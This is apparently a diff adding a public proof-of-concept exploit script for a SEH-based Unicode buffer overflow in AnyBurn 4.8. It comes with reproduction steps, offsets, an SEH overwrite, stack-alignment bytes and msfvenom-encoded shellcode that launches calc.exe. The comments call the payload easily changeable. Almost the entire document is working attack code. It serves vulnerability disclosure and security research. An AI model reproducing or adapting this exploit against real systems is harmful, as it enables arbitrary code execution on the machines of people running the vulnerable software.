@@ -1,0 +1,125 @@
+# Exploit Title: AnyBurn 4.8 - Buffer Overflow (SEH)
+# Date: 2020-03-09
+# Vendor Homepage: http://www.anyburn.com/
+# Software Link : http://www.anyburn.com/anyburn_setup.exe
+# Exploit Authors: "Richard Davy/Gary Nield"
+# Tested Version: 4.8 (32-bit)
+# Tested on: Windows 10 Enterprise x64
+# Vulnerability Type: Buffer Overflow/SEH/Unicode
+
+# Steps to Produce the Exploit:
+# 1.- Run python code
+# 2.- Open payload.txt and copy content to clipboard
+# 3.- Open AnyBurn choose 'Copy disk to image file'
+# 4.- Paste the content of payload.txt into the field: 'Select image file name'
+# 5.- Click 'Create Now' and you will see a crash and the payload launch.
+
+#!/usr/bin/env python
+
+#Set overall payload size
+crash_buffer_size = 10000
+#nseh offset for SEH overwrite
+nseh_offset = 9197
+
+#location in payload where stack alignment returns to for payload
+payloadret = 4459	
+#payload filler
+junk = "\x71" * payloadret 
+
+#Payload generated via msfvenom, easily changeable as padding is auto calculated
+#msfvenom -a x86 -p windows/exec cmd=calc.exe -e x86/unicode_upper BufferRegister=EAX -f py
+buf =  b""
+buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x51"
+buf += b"\x41\x54\x41\x58\x41\x5a\x41\x50\x55\x33\x51\x41\x44"
+buf += b"\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41"
+buf += b"\x51\x41\x49\x41\x51\x41\x50\x41\x35\x41\x41\x41\x50"
+buf += b"\x41\x5a\x31\x41\x49\x31\x41\x49\x41\x49\x41\x4a\x31"
+buf += b"\x31\x41\x49\x41\x49\x41\x58\x41\x35\x38\x41\x41\x50"
+buf += b"\x41\x5a\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49"
+buf += b"\x41\x49\x51\x49\x31\x31\x31\x31\x41\x49\x41\x4a\x51"
+buf += b"\x49\x31\x41\x59\x41\x5a\x42\x41\x42\x41\x42\x41\x42"
+buf += b"\x41\x42\x33\x30\x41\x50\x42\x39\x34\x34\x4a\x42\x4b"
+buf += b"\x4c\x5a\x48\x44\x42\x4d\x30\x4b\x50\x4b\x50\x43\x30"
+buf += b"\x44\x49\x49\x55\x50\x31\x49\x30\x43\x34\x54\x4b\x50"
+buf += b"\x50\x50\x30\x44\x4b\x42\x32\x4c\x4c\x54\x4b\x42\x32"
+buf += b"\x4c\x54\x34\x4b\x43\x42\x4d\x58\x4c\x4f\x46\x57\x4f"
+buf += b"\x5a\x4d\x56\x30\x31\x4b\x4f\x56\x4c\x4f\x4c\x33\x31"
+buf += b"\x43\x4c\x4c\x42\x4e\x4c\x4f\x30\x49\x31\x48\x4f\x4c"
+buf += b"\x4d\x4d\x31\x49\x37\x5a\x42\x4c\x32\x50\x52\x50\x57"
+buf += b"\x44\x4b\x30\x52\x4c\x50\x34\x4b\x50\x4a\x4f\x4c\x54"
+buf += b"\x4b\x50\x4c\x4c\x51\x54\x38\x5a\x43\x31\x38\x4b\x51"
+buf += b"\x48\x51\x32\x31\x44\x4b\x42\x39\x4d\x50\x4b\x51\x59"
+buf += b"\x43\x54\x4b\x51\x39\x4d\x48\x4b\x33\x4f\x4a\x4f\x59"
+buf += b"\x44\x4b\x30\x34\x44\x4b\x4d\x31\x5a\x36\x30\x31\x4b"
+buf += b"\x4f\x56\x4c\x57\x51\x58\x4f\x4c\x4d\x4b\x51\x39\x37"
+buf += b"\x4f\x48\x39\x50\x34\x35\x4b\x46\x4d\x33\x33\x4d\x4b"
+buf += b"\x48\x4f\x4b\x33\x4d\x4f\x34\x43\x45\x4b\x34\x42\x38"
+buf += b"\x44\x4b\x51\x48\x4e\x44\x4b\x51\x59\x43\x31\x56\x54"
+buf += b"\x4b\x4c\x4c\x30\x4b\x44\x4b\x50\x58\x4d\x4c\x4d\x31"
+buf += b"\x38\x53\x34\x4b\x4b\x54\x44\x4b\x4d\x31\x5a\x30\x53"
+buf += b"\x59\x51\x34\x4e\x44\x4d\x54\x51\x4b\x31\x4b\x43\x31"
+buf += b"\x52\x39\x51\x4a\x30\x51\x4b\x4f\x49\x50\x51\x4f\x51"
+buf += b"\x4f\x30\x5a\x34\x4b\x4c\x52\x4a\x4b\x34\x4d\x51\x4d"
+buf += b"\x31\x5a\x4b\x51\x34\x4d\x35\x35\x46\x52\x4b\x50\x4d"
+buf += b"\x30\x4b\x50\x30\x50\x51\x58\x4e\x51\x44\x4b\x42\x4f"
+buf += b"\x33\x57\x4b\x4f\x59\x45\x47\x4b\x5a\x50\x38\x35\x36"
+buf += b"\x42\x32\x36\x52\x48\x37\x36\x45\x45\x47\x4d\x45\x4d"
+buf += b"\x4b\x4f\x48\x55\x4f\x4c\x4d\x36\x53\x4c\x4c\x4a\x35"
+buf += b"\x30\x4b\x4b\x39\x50\x42\x55\x4c\x45\x57\x4b\x4f\x57"
+buf += b"\x4d\x43\x52\x52\x32\x4f\x42\x4a\x4d\x30\x42\x33\x4b"
+buf += b"\x4f\x4a\x35\x32\x43\x51\x51\x42\x4c\x52\x43\x4e\x4e"
+buf += b"\x53\x35\x42\x58\x52\x45\x4d\x30\x41\x41"
+
+#Filler padding after payload code to bring us to nseh offset
+#auto calculated in case payload size changes
+junk1 = "\x71" * int(nseh_offset-(len(junk)+len(buf)))
+
+#SEH Overwrite
+nSeh = "\x61\x70"
+#Unicode safe SEH return
+seh = "\x09\x48"
+
+#Stack realignment which takes us directly back into shellcode
+eax_align =  "\x70\x71\x71\x71" 	 	
+eax_align += "\x54" 					
+eax_align += "\x47" 					
+eax_align += "\x58"						
+eax_align += "\x47" 					
+eax_align += "\x05\x2F\x11" 			
+eax_align += "\x47" 					
+eax_align += "\x2d\x01\x11" 			
+eax_align += "\x47" 					
+eax_align += "\x50" 					
+eax_align += "\x47"						
+eax_align += "\xc3"						
+
+#Padding to take us to 10,000 
+padding = "\x71" * int(crash_buffer_size-(len(junk)+len(buf)+len(junk1)+len(nSeh)+len(seh)+len(eax_align)))
+
+#Assembly of parts 
+buffer=junk+buf+junk1+nSeh+seh+eax_align+padding
+
+try:
+	f=open("payload.txt","w")
+	print "\nAnyBurn Version 4.8 (32-bit) Exploit\n"
+	print "Software Link : http://www.anyburn.com/anyburn_setup.exe"
+	print "Exploit Authors: Richard Davy/Gary Nield"
+	print "Tested on: Windows 10 Enterprise x64"
+	print "Vulnerability Type: Buffer Overflow/SEH/Unicode\n"
+
+	print "Steps to Produce the Exploit:"
+	print "1.- Run python code"
+	print "2.- Open payload.txt and copy content to clipboard"
+	print "3.- Open AnyBurn choose 'Copy disk to image file'"
+	print "4.- Paste the content of payload.txt into the field: 'Select image file name'"
+	print "5.- Click 'Create Now' and you will see a crash and the payload launch.\n"
+
+	print "[+] Creating %s bytes evil payload " %len(buffer)
+	
+	f.write(buffer)
+	f.close()
+
+	print "[+] File payload.txt created..."
+
+except:
+	print "[!] File cannot be created..."
